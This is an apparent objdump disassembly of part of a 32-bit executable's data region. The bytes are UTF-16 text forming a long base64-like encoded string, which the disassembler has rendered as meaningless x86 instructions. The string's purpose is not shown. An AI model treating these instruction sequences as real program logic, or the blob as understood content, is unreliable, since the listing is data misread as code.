  40aafd:	6c                   	insb   (%dx),%es:(%edi)
  40aafe:	00 52 00             	add    %dl,0x0(%edx)
  40ab01:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40ab04:	00 30                	add    %dh,(%eax)
  40ab06:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40ab0a:	00 4e 00             	add    %cl,0x0(%esi)
  40ab0d:	33 00                	xor    (%eax),%eax
  40ab0f:	42                   	inc    %edx
  40ab10:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40ab14:	00 61 00             	add    %ah,0x0(%ecx)
  40ab17:	74 00                	je     0x40ab19
  40ab19:	63 00                	arpl   %eax,(%eax)
  40ab1b:	32 00                	xor    (%eax),%al
  40ab1d:	69 00 4e 00 42 00    	imul   $0x42004e,(%eax),%eax
  40ab23:	47                   	inc    %edi
  40ab24:	00 2f                	add    %ch,(%edi)
  40ab26:	00 5a 00             	add    %bl,0x0(%edx)
  40ab29:	79 00                	jns    0x40ab2b
  40ab2b:	4a                   	dec    %edx
  40ab2c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab2f:	42                   	inc    %edx
  40ab30:	00 2f                	add    %ch,(%edi)
  40ab32:	00 32                	add    %dh,(%edx)
  40ab34:	00 46 00             	add    %al,0x0(%esi)
  40ab37:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab38:	00 52 00             	add    %dl,0x0(%edx)
  40ab3b:	35 00 48 00 38       	xor    $0x38004800,%eax
  40ab40:	00 42 00             	add    %al,0x0(%edx)
  40ab43:	6a 00                	push   $0x0
  40ab45:	51                   	push   %ecx
  40ab46:	00 52 00             	add    %dl,0x0(%edx)
  40ab49:	4e                   	dec    %esi
  40ab4a:	00 6e 00             	add    %ch,0x0(%esi)
  40ab4d:	4e                   	dec    %esi
  40ab4e:	00 79 00             	add    %bh,0x0(%ecx)
  40ab51:	49                   	dec    %ecx
  40ab52:	00 6e 00             	add    %ch,0x0(%esi)
  40ab55:	4f                   	dec    %edi
  40ab56:	00 76 00             	add    %dh,0x0(%esi)
  40ab59:	38 00                	cmp    %al,(%eax)
  40ab5b:	52                   	push   %edx
  40ab5c:	00 50 00             	add    %dl,0x0(%eax)
  40ab5f:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40ab63:	6d                   	insl   (%dx),%es:(%edi)
  40ab64:	00 51 00             	add    %dl,0x0(%ecx)
  40ab67:	4f                   	dec    %edi
  40ab68:	00 35 00 32 00 50    	add    %dh,0x50003200
  40ab6e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab71:	77 00                	ja     0x40ab73
  40ab73:	70 00                	jo     0x40ab75
  40ab75:	49                   	dec    %ecx
  40ab76:	00 4f 00             	add    %cl,0x0(%edi)
  40ab79:	62 00                	bound  %eax,(%eax)
  40ab7b:	37                   	aaa
  40ab7c:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40ab80:	00 51 00             	add    %dl,0x0(%ecx)
  40ab83:	67 00 38             	add    %bh,(%bx,%si)
  40ab86:	00 77 00             	add    %dh,0x0(%edi)
  40ab89:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab8a:	00 45 00             	add    %al,0x0(%ebp)
  40ab8d:	72 00                	jb     0x40ab8f
  40ab8f:	37                   	aaa
  40ab90:	00 48 00             	add    %cl,0x0(%eax)
  40ab93:	34 00                	xor    $0x0,%al
  40ab95:	2f                   	das
  40ab96:	00 6e 00             	add    %ch,0x0(%esi)
  40ab99:	78 00                	js     0x40ab9b
  40ab9b:	61                   	popa
  40ab9c:	00 58 00             	add    %bl,0x0(%eax)
  40ab9f:	6a 00                	push   $0x0
  40aba1:	69 00 66 00 56 00    	imul   $0x560066,(%eax),%eax
  40aba7:	59                   	pop    %ecx
  40aba8:	00 78 00             	add    %bh,0x0(%eax)
  40abab:	45                   	inc    %ebp
  40abac:	00 68 00             	add    %ch,0x0(%eax)
  40abaf:	4e                   	dec    %esi
  40abb0:	00 43 00             	add    %al,0x0(%ebx)
  40abb3:	6b 00 38             	imul   $0x38,(%eax),%eax
  40abb6:	00 39                	add    %bh,(%ecx)
  40abb8:	00 69 00             	add    %ch,0x0(%ecx)
  40abbb:	7a 00                	jp     0x40abbd
  40abbd:	4d                   	dec    %ebp
  40abbe:	00 79 00             	add    %bh,0x0(%ecx)
  40abc1:	33 00                	xor    (%eax),%eax
  40abc3:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40abc7:	49                   	dec    %ecx
  40abc8:	00 41 00             	add    %al,0x0(%ecx)
  40abcb:	53                   	push   %ebx
  40abcc:	00 65 00             	add    %ah,0x0(%ebp)
  40abcf:	66 00 38             	data16 add %bh,(%eax)
  40abd2:	00 31                	add    %dh,(%ecx)
  40abd4:	00 2f                	add    %ch,(%edi)
  40abd6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abd9:	41                   	inc    %ecx
  40abda:	00 7a 00             	add    %bh,0x0(%edx)
  40abdd:	6a 00                	push   $0x0
  40abdf:	39 00                	cmp    %eax,(%eax)
  40abe1:	41                   	inc    %ecx
  40abe2:	00 4f 00             	add    %cl,0x0(%edi)
  40abe5:	32 00                	xor    (%eax),%al
  40abe7:	5a                   	pop    %edx
  40abe8:	00 4a 00             	add    %cl,0x0(%edx)
  40abeb:	59                   	pop    %ecx
  40abec:	00 52 00             	add    %dl,0x0(%edx)
  40abef:	31 00                	xor    %eax,(%eax)
  40abf1:	2b 00                	sub    (%eax),%eax
  40abf3:	55                   	push   %ebp
  40abf4:	00 76 00             	add    %dh,0x0(%esi)
  40abf7:	31 00                	xor    %eax,(%eax)
  40abf9:	63 00                	arpl   %eax,(%eax)
  40abfb:	42                   	inc    %edx
  40abfc:	00 48 00             	add    %cl,0x0(%eax)
  40abff:	46                   	inc    %esi
  40ac00:	00 59 00             	add    %bl,0x0(%ecx)
  40ac03:	6c                   	insb   (%dx),%es:(%edi)
  40ac04:	00 69 00             	add    %ch,0x0(%ecx)
  40ac07:	44                   	inc    %esp
  40ac08:	00 57 00             	add    %dl,0x0(%edi)
  40ac0b:	30 00                	xor    %al,(%eax)
  40ac0d:	2b 00                	sub    (%eax),%eax
  40ac0f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac10:	00 51 00             	add    %dl,0x0(%ecx)
  40ac13:	76 00                	jbe    0x40ac15
  40ac15:	49                   	dec    %ecx
  40ac16:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40ac1a:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40ac1e:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40ac22:	00 5a 00             	add    %bl,0x0(%edx)
  40ac25:	61                   	popa
  40ac26:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac29:	52                   	push   %edx
  40ac2a:	00 71 00             	add    %dh,0x0(%ecx)
  40ac2d:	39 00                	cmp    %eax,(%eax)
  40ac2f:	4a                   	dec    %edx
  40ac30:	00 36                	add    %dh,(%esi)
  40ac32:	00 6f 00             	add    %ch,0x0(%edi)
  40ac35:	46                   	inc    %esi
  40ac36:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac39:	4a                   	dec    %edx
  40ac3a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac3d:	2b 00                	sub    (%eax),%eax
  40ac3f:	6d                   	insl   (%dx),%es:(%edi)
  40ac40:	00 35 00 45 00 36    	add    %dh,0x36004500
  40ac46:	00 6a 00             	add    %ch,0x0(%edx)
  40ac49:	63 00                	arpl   %eax,(%eax)
  40ac4b:	75 00                	jne    0x40ac4d
  40ac4d:	70 00                	jo     0x40ac4f
  40ac4f:	4a                   	dec    %edx
  40ac50:	00 48 00             	add    %cl,0x0(%eax)
  40ac53:	69 00 79 00 34 00    	imul   $0x340079,(%eax),%eax
  40ac59:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac5a:	00 37                	add    %dh,(%edi)
  40ac5c:	00 39                	add    %bh,(%ecx)
  40ac5e:	00 78 00             	add    %bh,0x0(%eax)
  40ac61:	2b 00                	sub    (%eax),%eax
  40ac63:	4d                   	dec    %ebp
  40ac64:	00 42 00             	add    %al,0x0(%edx)
  40ac67:	57                   	push   %edi
  40ac68:	00 72 00             	add    %dh,0x0(%edx)
  40ac6b:	61                   	popa
  40ac6c:	00 57 00             	add    %dl,0x0(%edi)
  40ac6f:	36 00 32             	add    %dh,%ss:(%edx)
  40ac72:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac75:	78 00                	js     0x40ac77
  40ac77:	4f                   	dec    %edi
  40ac78:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40ac7c:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40ac80:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac83:	4b                   	dec    %ebx
  40ac84:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40ac88:	00 61 00             	add    %ah,0x0(%ecx)
  40ac8b:	5a                   	pop    %edx
  40ac8c:	00 6e 00             	add    %ch,0x0(%esi)
  40ac8f:	73 00                	jae    0x40ac91
  40ac91:	35 00 31 00 55       	xor    $0x55003100,%eax
  40ac96:	00 49 00             	add    %cl,0x0(%ecx)
  40ac99:	6a 00                	push   $0x0
  40ac9b:	4b                   	dec    %ebx
  40ac9c:	00 48 00             	add    %cl,0x0(%eax)
  40ac9f:	79 00                	jns    0x40aca1
  40aca1:	70 00                	jo     0x40aca3
  40aca3:	78 00                	js     0x40aca5
  40aca5:	71 00                	jno    0x40aca7
  40aca7:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40acab:	53                   	push   %ebx
  40acac:	00 43 00             	add    %al,0x0(%ebx)
  40acaf:	30 00                	xor    %al,(%eax)
  40acb1:	7a 00                	jp     0x40acb3
  40acb3:	32 00                	xor    (%eax),%al
  40acb5:	57                   	push   %edi
  40acb6:	00 69 00             	add    %ch,0x0(%ecx)
  40acb9:	42                   	inc    %edx
  40acba:	00 46 00             	add    %al,0x0(%esi)
  40acbd:	73 00                	jae    0x40acbf
  40acbf:	4b                   	dec    %ebx
  40acc0:	00 55 00             	add    %dl,0x0(%ebp)
  40acc3:	72 00                	jb     0x40acc5
  40acc5:	34 00                	xor    $0x0,%al
  40acc7:	6a 00                	push   $0x0
  40acc9:	59                   	pop    %ecx
  40acca:	00 6f 00             	add    %ch,0x0(%edi)
  40accd:	56                   	push   %esi
  40acce:	00 4e 00             	add    %cl,0x0(%esi)
  40acd1:	41                   	inc    %ecx
  40acd2:	00 35 00 4b 00 43    	add    %dh,0x43004b00
  40acd8:	00 39                	add    %bh,(%ecx)
  40acda:	00 6b 00             	add    %ch,0x0(%ebx)
  40acdd:	48                   	dec    %eax
  40acde:	00 33                	add    %dh,(%ebx)
  40ace0:	00 73 00             	add    %dh,0x0(%ebx)
  40ace3:	5a                   	pop    %edx
  40ace4:	00 2b                	add    %ch,(%ebx)
  40ace6:	00 2b                	add    %ch,(%ebx)
  40ace8:	00 57 00             	add    %dl,0x0(%edi)
  40aceb:	4c                   	dec    %esp
  40acec:	00 37                	add    %dh,(%edi)
  40acee:	00 42 00             	add    %al,0x0(%edx)
  40acf1:	61                   	popa
  40acf2:	00 70 00             	add    %dh,0x0(%eax)
  40acf5:	74 00                	je     0x40acf7
  40acf7:	34 00                	xor    $0x0,%al
  40acf9:	75 00                	jne    0x40acfb
  40acfb:	68 00 30 00 64       	push   $0x64003000
  40ad00:	00 50 00             	add    %dl,0x0(%eax)
  40ad03:	51                   	push   %ecx
  40ad04:	00 63 00             	add    %ah,0x0(%ebx)
  40ad07:	4b                   	dec    %ebx
  40ad08:	00 38                	add    %bh,(%eax)
  40ad0a:	00 41 00             	add    %al,0x0(%ecx)
  40ad0d:	37                   	aaa
  40ad0e:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad11:	61                   	popa
  40ad12:	00 70 00             	add    %dh,0x0(%eax)
  40ad15:	41                   	inc    %ecx
  40ad16:	00 41 00             	add    %al,0x0(%ecx)
  40ad19:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40ad1d:	32 00                	xor    (%eax),%al
  40ad1f:	78 00                	js     0x40ad21
  40ad21:	48                   	dec    %eax
  40ad22:	00 61 00             	add    %ah,0x0(%ecx)
  40ad25:	62 00                	bound  %eax,(%eax)
  40ad27:	76 00                	jbe    0x40ad29
  40ad29:	69 00 31 00 63 00    	imul   $0x630031,(%eax),%eax
  40ad2f:	49                   	dec    %ecx
  40ad30:	00 53 00             	add    %dl,0x0(%ebx)
  40ad33:	71 00                	jno    0x40ad35
  40ad35:	51                   	push   %ecx
  40ad36:	00 57 00             	add    %dl,0x0(%edi)
  40ad39:	4c                   	dec    %esp
  40ad3a:	00 33                	add    %dh,(%ebx)
  40ad3c:	00 33                	add    %dh,(%ebx)
  40ad3e:	00 78 00             	add    %bh,0x0(%eax)
  40ad41:	33 00                	xor    (%eax),%eax
  40ad43:	30 00                	xor    %al,(%eax)
  40ad45:	4f                   	dec    %edi
  40ad46:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40ad4a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad4d:	47                   	inc    %edi
  40ad4e:	00 65 00             	add    %ah,0x0(%ebp)
  40ad51:	61                   	popa
  40ad52:	00 37                	add    %dh,(%edi)
  40ad54:	00 43 00             	add    %al,0x0(%ebx)
  40ad57:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40ad5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad5c:	00 70 00             	add    %dh,0x0(%eax)
  40ad5f:	6d                   	insl   (%dx),%es:(%edi)
  40ad60:	00 45 00             	add    %al,0x0(%ebp)
  40ad63:	68 00 66 00 69       	push   $0x69006600
  40ad68:	00 76 00             	add    %dh,0x0(%esi)
  40ad6b:	44                   	inc    %esp
  40ad6c:	00 5a 00             	add    %bl,0x0(%edx)
  40ad6f:	2f                   	das
  40ad70:	00 68 00             	add    %ch,0x0(%eax)
  40ad73:	4e                   	dec    %esi
  40ad74:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad77:	56                   	push   %esi
  40ad78:	00 41 00             	add    %al,0x0(%ecx)
  40ad7b:	70 00                	jo     0x40ad7d
  40ad7d:	4e                   	dec    %esi
  40ad7e:	00 73 00             	add    %dh,0x0(%ebx)
  40ad81:	69 00 48 00 47 00    	imul   $0x470048,(%eax),%eax
  40ad87:	37                   	aaa
  40ad88:	00 71 00             	add    %dh,0x0(%ecx)
  40ad8b:	35 00 35 00 4e       	xor    $0x4e003500,%eax
  40ad90:	00 75 00             	add    %dh,0x0(%ebp)
  40ad93:	31 00                	xor    %eax,(%eax)
  40ad95:	48                   	dec    %eax
  40ad96:	00 38                	add    %bh,(%eax)
  40ad98:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40ad9c:	00 69 00             	add    %ch,0x0(%ecx)
  40ad9f:	77 00                	ja     0x40ada1
  40ada1:	31 00                	xor    %eax,(%eax)
  40ada3:	45                   	inc    %ebp
  40ada4:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40ada8:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40adac:	00 73 00             	add    %dh,0x0(%ebx)
  40adaf:	67 00 65 00          	add    %ah,0x0(%di)
  40adb3:	75 00                	jne    0x40adb5
  40adb5:	78 00                	js     0x40adb7
  40adb7:	6e                   	outsb  %ds:(%esi),(%dx)
  40adb8:	00 4b 00             	add    %cl,0x0(%ebx)
  40adbb:	77 00                	ja     0x40adbd
  40adbd:	63 00                	arpl   %eax,(%eax)
  40adbf:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  40adc4:	00 73 00             	add    %dh,0x0(%ebx)
  40adc7:	6e                   	outsb  %ds:(%esi),(%dx)
  40adc8:	00 4f 00             	add    %cl,0x0(%edi)
  40adcb:	71 00                	jno    0x40adcd
  40adcd:	53                   	push   %ebx
  40adce:	00 53 00             	add    %dl,0x0(%ebx)
  40add1:	52                   	push   %edx
  40add2:	00 46 00             	add    %al,0x0(%esi)
  40add5:	6f                   	outsl  %ds:(%esi),(%dx)
  40add6:	00 63 00             	add    %ah,0x0(%ebx)
  40add9:	51                   	push   %ecx
  40adda:	00 32                	add    %dh,(%edx)
  40addc:	00 68 00             	add    %ch,0x0(%eax)
  40addf:	70 00                	jo     0x40ade1
  40ade1:	41                   	inc    %ecx
  40ade2:	00 55 00             	add    %dl,0x0(%ebp)
  40ade5:	4c                   	dec    %esp
  40ade6:	00 78 00             	add    %bh,0x0(%eax)
  40ade9:	62 00                	bound  %eax,(%eax)
  40adeb:	37                   	aaa
  40adec:	00 66 00             	add    %ah,0x0(%esi)
  40adef:	5a                   	pop    %edx
  40adf0:	00 33                	add    %dh,(%ebx)
  40adf2:	00 47 00             	add    %al,0x0(%edi)
  40adf5:	46                   	inc    %esi
  40adf6:	00 35 00 4d 00 4f    	add    %dh,0x4f004d00
  40adfc:	00 38                	add    %bh,(%eax)
  40adfe:	00 6a 00             	add    %ch,0x0(%edx)
  40ae01:	51                   	push   %ecx
  40ae02:	00 56 00             	add    %dl,0x0(%esi)
  40ae05:	57                   	push   %edi
  40ae06:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae09:	38 00                	cmp    %al,(%eax)
  40ae0b:	62 00                	bound  %eax,(%eax)
  40ae0d:	59                   	pop    %ecx
  40ae0e:	00 58 00             	add    %bl,0x0(%eax)
  40ae11:	52                   	push   %edx
  40ae12:	00 75 00             	add    %dh,0x0(%ebp)
  40ae15:	6a 00                	push   $0x0
  40ae17:	62 00                	bound  %eax,(%eax)
  40ae19:	70 00                	jo     0x40ae1b
  40ae1b:	44                   	inc    %esp
  40ae1c:	00 6f 00             	add    %ch,0x0(%edi)
  40ae1f:	62 00                	bound  %eax,(%eax)
  40ae21:	32 00                	xor    (%eax),%al
  40ae23:	2b 00                	sub    (%eax),%eax
  40ae25:	72 00                	jb     0x40ae27
  40ae27:	44                   	inc    %esp
  40ae28:	00 33                	add    %dh,(%ebx)
  40ae2a:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae2d:	53                   	push   %ebx
  40ae2e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae31:	45                   	inc    %ebp
  40ae32:	00 4f 00             	add    %cl,0x0(%edi)
  40ae35:	42                   	inc    %edx
  40ae36:	00 6f 00             	add    %ch,0x0(%edi)
  40ae39:	79 00                	jns    0x40ae3b
  40ae3b:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40ae3f:	54                   	push   %esp
  40ae40:	00 73 00             	add    %dh,0x0(%ebx)
  40ae43:	52                   	push   %edx
  40ae44:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40ae48:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40ae4c:	00 49 00             	add    %cl,0x0(%ecx)
  40ae4f:	68 00 6e 00 6a       	push   $0x6a006e00
  40ae54:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40ae58:	00 75 00             	add    %dh,0x0(%ebp)
  40ae5b:	46                   	inc    %esi
  40ae5c:	00 79 00             	add    %bh,0x0(%ecx)
  40ae5f:	43                   	inc    %ebx
  40ae60:	00 72 00             	add    %dh,0x0(%edx)
  40ae63:	42                   	inc    %edx
  40ae64:	00 4a 00             	add    %cl,0x0(%edx)
  40ae67:	58                   	pop    %eax
  40ae68:	00 31                	add    %dh,(%ecx)
  40ae6a:	00 77 00             	add    %dh,0x0(%edi)
  40ae6d:	76 00                	jbe    0x40ae6f
  40ae6f:	56                   	push   %esi
  40ae70:	00 68 00             	add    %ch,0x0(%eax)
  40ae73:	4f                   	dec    %edi
  40ae74:	00 31                	add    %dh,(%ecx)
  40ae76:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae79:	39 00                	cmp    %eax,(%eax)
  40ae7b:	6a 00                	push   $0x0
  40ae7d:	33 00                	xor    (%eax),%eax
  40ae7f:	47                   	inc    %edi
  40ae80:	00 33                	add    %dh,(%ebx)
  40ae82:	00 39                	add    %bh,(%ecx)
  40ae84:	00 41 00             	add    %al,0x0(%ecx)
  40ae87:	30 00                	xor    %al,(%eax)
  40ae89:	6d                   	insl   (%dx),%es:(%edi)
  40ae8a:	00 50 00             	add    %dl,0x0(%eax)
  40ae8d:	5a                   	pop    %edx
  40ae8e:	00 6a 00             	add    %ch,0x0(%edx)
  40ae91:	50                   	push   %eax
  40ae92:	00 6e 00             	add    %ch,0x0(%esi)
  40ae95:	2f                   	das
  40ae96:	00 41 00             	add    %al,0x0(%ecx)
  40ae99:	31 00                	xor    %eax,(%eax)
  40ae9b:	69 00 35 00 64 00    	imul   $0x640035,(%eax),%eax
  40aea1:	4d                   	dec    %ebp
  40aea2:	00 62 00             	add    %ah,0x0(%edx)
  40aea5:	2b 00                	sub    (%eax),%eax
  40aea7:	34 00                	xor    $0x0,%al
  40aea9:	38 00                	cmp    %al,(%eax)
  40aeab:	56                   	push   %esi
  40aeac:	00 57 00             	add    %dl,0x0(%edi)
  40aeaf:	35 00 39 00 49       	xor    $0x49003900,%eax
  40aeb4:	00 68 00             	add    %ch,0x0(%eax)
  40aeb7:	2b 00                	sub    (%eax),%eax
  40aeb9:	55                   	push   %ebp
  40aeba:	00 6e 00             	add    %ch,0x0(%esi)
  40aebd:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40aec1:	5a                   	pop    %edx
  40aec2:	00 52 00             	add    %dl,0x0(%edx)
  40aec5:	47                   	inc    %edi
  40aec6:	00 4b 00             	add    %cl,0x0(%ebx)
  40aec9:	79 00                	jns    0x40aecb
  40aecb:	79 00                	jns    0x40aecd
  40aecd:	47                   	inc    %edi
  40aece:	00 46 00             	add    %al,0x0(%esi)
  40aed1:	33 00                	xor    (%eax),%eax
  40aed3:	71 00                	jno    0x40aed5
  40aed5:	79 00                	jns    0x40aed7
  40aed7:	4f                   	dec    %edi
  40aed8:	00 4d 00             	add    %cl,0x0(%ebp)
  40aedb:	35 00 48 00 4d       	xor    $0x4d004800,%eax
  40aee0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aee3:	62 00                	bound  %eax,(%eax)
  40aee5:	56                   	push   %esi
  40aee6:	00 65 00             	add    %ah,0x0(%ebp)
  40aee9:	76 00                	jbe    0x40aeeb
  40aeeb:	58                   	pop    %eax
  40aeec:	00 35 00 7a 00 4a    	add    %dh,0x4a007a00
  40aef2:	00 61 00             	add    %ah,0x0(%ecx)
  40aef5:	39 00                	cmp    %eax,(%eax)
  40aef7:	46                   	inc    %esi
  40aef8:	00 53 00             	add    %dl,0x0(%ebx)
  40aefb:	4f                   	dec    %edi
  40aefc:	00 47 00             	add    %al,0x0(%edi)
  40aeff:	4a                   	dec    %edx
  40af00:	00 72 00             	add    %dh,0x0(%edx)
  40af03:	35 00 43 00 4c       	xor    $0x4c004300,%eax
  40af08:	00 62 00             	add    %ah,0x0(%edx)
  40af0b:	47                   	inc    %edi
  40af0c:	00 4d 00             	add    %cl,0x0(%ebp)
  40af0f:	76 00                	jbe    0x40af11
  40af11:	36 00 31             	add    %dh,%ss:(%ecx)
  40af14:	00 63 00             	add    %ah,0x0(%ebx)
  40af17:	49                   	dec    %ecx
  40af18:	00 56 00             	add    %dl,0x0(%esi)
  40af1b:	5a                   	pop    %edx
  40af1c:	00 6a 00             	add    %ch,0x0(%edx)
  40af1f:	56                   	push   %esi
  40af20:	00 50 00             	add    %dl,0x0(%eax)
  40af23:	50                   	push   %eax
  40af24:	00 47 00             	add    %al,0x0(%edi)
  40af27:	75 00                	jne    0x40af29
  40af29:	69 00 32 00 4d 00    	imul   $0x4d0032,(%eax),%eax
  40af2f:	65 00 38             	add    %bh,%gs:(%eax)
  40af32:	00 30                	add    %dh,(%eax)
  40af34:	00 36                	add    %dh,(%esi)
  40af36:	00 2f                	add    %ch,(%edi)
  40af38:	00 73 00             	add    %dh,0x0(%ebx)
  40af3b:	71 00                	jno    0x40af3d
  40af3d:	68 00 31 00 2f       	push   $0x2f003100
  40af42:	00 77 00             	add    %dh,0x0(%edi)
  40af45:	4d                   	dec    %ebp
  40af46:	00 75 00             	add    %dh,0x0(%ebp)
  40af49:	35 00 67 00 2b       	xor    $0x2b006700,%eax
  40af4e:	00 32                	add    %dh,(%edx)
  40af50:	00 78 00             	add    %bh,0x0(%eax)
  40af53:	5a                   	pop    %edx
  40af54:	00 70 00             	add    %dh,0x0(%eax)
  40af57:	77 00                	ja     0x40af59
  40af59:	32 00                	xor    (%eax),%al
  40af5b:	6d                   	insl   (%dx),%es:(%edi)
  40af5c:	00 49 00             	add    %cl,0x0(%ecx)
  40af5f:	4d                   	dec    %ebp
  40af60:	00 4a 00             	add    %cl,0x0(%edx)
  40af63:	45                   	inc    %ebp
  40af64:	00 7a 00             	add    %bh,0x0(%edx)
  40af67:	73 00                	jae    0x40af69
  40af69:	71 00                	jno    0x40af6b
  40af6b:	4d                   	dec    %ebp
  40af6c:	00 55 00             	add    %dl,0x0(%ebp)
  40af6f:	5a                   	pop    %edx
  40af70:	00 4e 00             	add    %cl,0x0(%esi)
  40af73:	45                   	inc    %ebp
  40af74:	00 6f 00             	add    %ch,0x0(%edi)
  40af77:	2f                   	das
  40af78:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40af7c:	00 63 00             	add    %ah,0x0(%ebx)
  40af7f:	43                   	inc    %ebx
  40af80:	00 63 00             	add    %ah,0x0(%ebx)
  40af83:	46                   	inc    %esi
  40af84:	00 67 00             	add    %ah,0x0(%edi)
  40af87:	56                   	push   %esi
  40af88:	00 31                	add    %dh,(%ecx)
  40af8a:	00 39                	add    %bh,(%ecx)
  40af8c:	00 70 00             	add    %dh,0x0(%eax)
  40af8f:	77 00                	ja     0x40af91
  40af91:	33 00                	xor    (%eax),%eax
  40af93:	79 00                	jns    0x40af95
  40af95:	31 00                	xor    %eax,(%eax)
  40af97:	4c                   	dec    %esp
  40af98:	00 51 00             	add    %dl,0x0(%ecx)
  40af9b:	75 00                	jne    0x40af9d
  40af9d:	77 00                	ja     0x40af9f
  40af9f:	59                   	pop    %ecx
  40afa0:	00 51 00             	add    %dl,0x0(%ecx)
  40afa3:	42                   	inc    %edx
  40afa4:	00 51 00             	add    %dl,0x0(%ecx)
  40afa7:	37                   	aaa
  40afa8:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40afac:	00 4a 00             	add    %cl,0x0(%edx)
  40afaf:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40afb3:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40afb7:	50                   	push   %eax
  40afb8:	00 61 00             	add    %ah,0x0(%ecx)
  40afbb:	72 00                	jb     0x40afbd
  40afbd:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40afc0:	00 70 00             	add    %dh,0x0(%eax)
  40afc3:	61                   	popa
  40afc4:	00 51 00             	add    %dl,0x0(%ecx)
  40afc7:	61                   	popa
  40afc8:	00 52 00             	add    %dl,0x0(%edx)
  40afcb:	4a                   	dec    %edx
  40afcc:	00 4e 00             	add    %cl,0x0(%esi)
  40afcf:	4f                   	dec    %edi
  40afd0:	00 59 00             	add    %bl,0x0(%ecx)
  40afd3:	58                   	pop    %eax
  40afd4:	00 57 00             	add    %dl,0x0(%edi)
  40afd7:	38 00                	cmp    %al,(%eax)
  40afd9:	37                   	aaa
  40afda:	00 71 00             	add    %dh,0x0(%ecx)
  40afdd:	58                   	pop    %eax
  40afde:	00 53 00             	add    %dl,0x0(%ebx)
  40afe1:	57                   	push   %edi
  40afe2:	00 45 00             	add    %al,0x0(%ebp)
  40afe5:	34 00                	xor    $0x0,%al
  40afe7:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40afea:	00 4f 00             	add    %cl,0x0(%edi)
  40afed:	2b 00                	sub    (%eax),%eax
  40afef:	39 00                	cmp    %eax,(%eax)
  40aff1:	53                   	push   %ebx
  40aff2:	00 31                	add    %dh,(%ecx)
  40aff4:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40aff8:	00 4a 00             	add    %cl,0x0(%edx)
  40affb:	34 00                	xor    $0x0,%al
  40affd:	7a 00                	jp     0x40afff
  40afff:	5a                   	pop    %edx
  40b000:	00 61 00             	add    %ah,0x0(%ecx)
  40b003:	58                   	pop    %eax
  40b004:	00 77 00             	add    %dh,0x0(%edi)
  40b007:	63 00                	arpl   %eax,(%eax)
  40b009:	4a                   	dec    %edx
  40b00a:	00 65 00             	add    %ah,0x0(%ebp)
  40b00d:	45                   	inc    %ebp
  40b00e:	00 46 00             	add    %al,0x0(%esi)
  40b011:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40b015:	34 00                	xor    $0x0,%al
  40b017:	34 00                	xor    $0x0,%al
  40b019:	78 00                	js     0x40b01b
  40b01b:	50                   	push   %eax
  40b01c:	00 59 00             	add    %bl,0x0(%ecx)
  40b01f:	68 00 71 00 4e       	push   $0x4e007100
  40b024:	00 57 00             	add    %dl,0x0(%edi)
  40b027:	6b 00 39             	imul   $0x39,(%eax),%eax
  40b02a:	00 62 00             	add    %ah,0x0(%edx)
  40b02d:	4b                   	dec    %ebx
  40b02e:	00 39                	add    %bh,(%ecx)
  40b030:	00 59 00             	add    %bl,0x0(%ecx)
  40b033:	47                   	inc    %edi
  40b034:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40b038:	00 7a 00             	add    %bh,0x0(%edx)
  40b03b:	4d                   	dec    %ebp
  40b03c:	00 5a 00             	add    %bl,0x0(%edx)
  40b03f:	73 00                	jae    0x40b041
  40b041:	6f                   	outsl  %ds:(%esi),(%dx)
  40b042:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40b046:	00 2b                	add    %ch,(%ebx)
